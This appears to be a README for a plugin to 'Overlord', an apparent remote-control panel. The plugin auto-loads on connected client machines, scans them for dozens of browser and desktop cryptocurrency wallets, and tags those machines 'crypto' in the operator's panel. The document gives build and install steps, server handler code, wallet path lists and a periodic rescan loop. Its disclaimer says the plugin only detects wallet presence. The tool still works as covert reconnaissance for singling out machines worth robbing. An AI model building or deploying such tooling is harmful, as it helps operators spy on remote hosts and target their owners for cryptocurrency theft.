# Wallet Detection Plugin for Overlord

Automatically detects cryptocurrency wallets on client systems and adds a "crypto" tag to the Overlord web panel.

## Features

- 🦊 **Browser Extensions**: MetaMask, Phantom, Binance Wallet, Coinbase Wallet, Trust Wallet, Brave Wallet, OKX, Exodus, Rabby, Math Wallet, Crypto.com, Ronin, TronLink, SafePal, TokenPocket, XDEFI, Nami, Eternl, Keplr, Petra Aptos, Solflare, Slope, Guarda, Jaxx Liberty, BitKeep, Core, Coin98, Clover, ioPay, Wombat, NeoLine, Terra Station, Liquality, Saturn, Guild, Talisman, Polymesh (40+ extensions)
- 💻 **Desktop Wallets**: Exodus, Electrum, Atomic Wallet, Bitcoin Core, Ethereum Wallet, Monero GUI, Ledger Live, Trezor Suite, Binance, Trust Wallet, Coinomi, Jaxx Liberty, Edge, Guarda, Wasabi, Samourai, Mycelium, Blockchain.com, Zcash, Dash Core, Litecoin Core, Dogecoin Core, Daedalus, Yoroi, MultiBit, Armory, Bitcoin Knots, Sparrow, Specter, BlueWallet, Zap, Phoenix, Breez (30+ desktop apps)
- 🖥️ **Multi-Platform**: Windows, Linux, macOS support
- 🚀 **Auto-Load**: Automatically runs when clients connect
- 🏷️ **Auto-Tag**: Adds "crypto" tag to client in web panel

## Quick Start

### 1. Build the Plugin

**Windows:**
```batch
cd plugin-wallet-detect
build-plugin.bat
```

**Linux/macOS:**
```bash
cd plugin-wallet-detect
chmod +x build-plugin.sh
./build-plugin.sh
```

This creates `wallet-detect.zip` with binaries for all platforms.

### 2. Install the Plugin

**Option A: Upload via Web UI**
1. Go to `https://your-overlord-server/plugins`
2. Click "Upload Plugin"
3. Select `wallet-detect.zip`

**Option B: Manual Installation**
1. Copy `wallet-detect.zip` to `Overlord-Server/plugins/`
2. Restart the Overlord server

### 3. Enable Auto-Load

Make the plugin run automatically on every client connection:

**Via API:**
```bash
curl -X POST https://your-overlord-server/api/plugins/wallet-detect/autoload \
  -H "Content-Type: application/json" \
  -d '{"autoLoad": true}'
```

**Via Web UI:**
1. Go to `/plugins`
2. Find "wallet-detect"
3. Toggle "Auto-Load" to ON

### 4. Verify Installation

1. Connect a client to your Overlord server
2. Wait 5-10 seconds for the scan to complete
3. Check the client page - you should see a "crypto" tag if wallets are detected

## How It Works

### Detection Flow

1. **Client Connects** → Plugin auto-loads (if enabled)
2. **Plugin Initializes** → Scans system for wallet paths
3. **Scan Completes** → Sends results to server
4. **Server Updates** → Adds "crypto" tag to client
5. **UI Updates** → Tag appears in web panel

### Detected Wallet Locations

**Windows:**
- Browser extensions: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\`
- Desktop apps: `%APPDATA%\Exodus`, `%APPDATA%\Electrum`, etc.

**Linux:**
- Browser extensions: `~/.config/google-chrome/Default/Extensions/`
- Desktop apps: `~/.config/Exodus`, `~/.electrum`, `~/.bitcoin`, etc.

**macOS:**
- Browser extensions: `~/Library/Application Support/Google/Chrome/Default/Extensions/`
- Desktop apps: `~/Library/Application Support/Exodus`, etc.

## Server-Side Integration

The plugin sends `scan_complete` events to the server with wallet data. To handle these events and update client tags, you need to modify the server code.

### Add Event Handler (Overlord-Server)

Add this to your plugin event handler in `Overlord-Server/src/plugins/runtime.ts` (or equivalent):

```typescript
// Handle wallet detection results
if (event === 'scan_complete' && pluginId === 'wallet-detect') {
  const report = payload as { wallets: Array<any>, summary: string };
  
  // Update client tags with crypto info
  if (report.summary && report.summary !== 'none') {
    await updateClientTags(clientId, { crypto: report.summary });
  }
  
  // Log detected wallets
  console.log(`[wallet-detect] Client ${clientId}: ${report.summary}`);
  for (const wallet of report.wallets) {
    console.log(`  - ${wallet.walletType}: ${wallet.location}`);
  }
}
```

### Update Client Tags Function

If you don't have a tag update function, add this:

```typescript
async function updateClientTags(clientId: string, tags: Record<string, string>) {
  const client = clients.get(clientId);
  if (!client) return;
  
  client.tags = { ...client.tags, ...tags };
  
  // Persist to database
  await db.run(
    'UPDATE clients SET tags = ? WHERE id = ?',
    [JSON.stringify(client.tags), clientId]
  );
  
  // Broadcast update to viewers
  broadcastToViewers(clientId, {
    type: 'client_update',
    clientId,
    tags: client.tags
  });
}
```

## Plugin UI

Access the plugin UI at:
```
https://your-overlord-server/plugins/wallet-detect?clientId=CLIENT_ID
```

Features:
- View detected wallets
- Manual rescan trigger
- Activity log

## Customization

### Add More Wallets

Edit `native/main.go` and add wallet paths to the scan functions:

```go
browserWallets := map[string][]string{
  "YourWallet": {
    filepath.Join(localAppData, "Path\\To\\Wallet"),
  },
}
```

### Change Scan Behavior

By default, the plugin scans once on load. To enable continuous scanning:

```go
func handleInit(hostJSON []byte) error {
  // ... existing code ...
  
  // Scan every 5 minutes
  go func() {
    ticker := time.NewTicker(5 * time.Minute)
    for range ticker.C {
      detectWallets()
    }
  }()
  
  return nil
}
```

## Troubleshooting

### Plugin Not Loading
- Check server logs: `journalctl -u overlord -f` (Linux) or Docker logs
- Verify plugin is enabled: `GET /api/plugins`
- Check client logs for load errors

### No Wallets Detected
- Plugin only detects installed wallets, not active ones
- Browser extensions must be in default profile
- Some wallets may use non-standard paths

### Tags Not Appearing
- Ensure server-side integration code is added
- Check database schema supports tags column
- Verify WebSocket broadcasts are working

## Security Notes

⚠️ **Important:**
- This plugin only detects wallet **presence**, not private keys or seed phrases
- Detection does not extract or exfiltrate wallet data
- Use responsibly and ethically
- Ensure proper authorization before deploying

## Build Targets

Default build includes:
- `windows-amd64` (Windows 64-bit)
- `windows-386` (Windows 32-bit)
- `linux-amd64` (Linux 64-bit)
- `linux-arm64` (Linux ARM64)
- `darwin-arm64` (macOS Apple Silicon)
- `darwin-amd64` (macOS Intel)

Override with:
```bash
BUILD_TARGETS="windows-amd64 linux-amd64" ./build-plugin.sh
```

## Development

### Test Locally

1. Build plugin: `./build-plugin.sh`
2. Upload to local Overlord instance
3. Connect test client
4. Check `/plugins/wallet-detect?clientId=test-client`

### Debug Logging

The plugin logs to the agent's stdout:
```
[wallet-detect] init: clientId=abc123 os=windows arch=amd64
[wallet-detect] starting wallet scan on windows
[wallet-detect] scan complete: found 3 wallets
```

## License

Same as Overlord (Apache 2.0)

## Support

For issues or questions, contact your Overlord administrator.
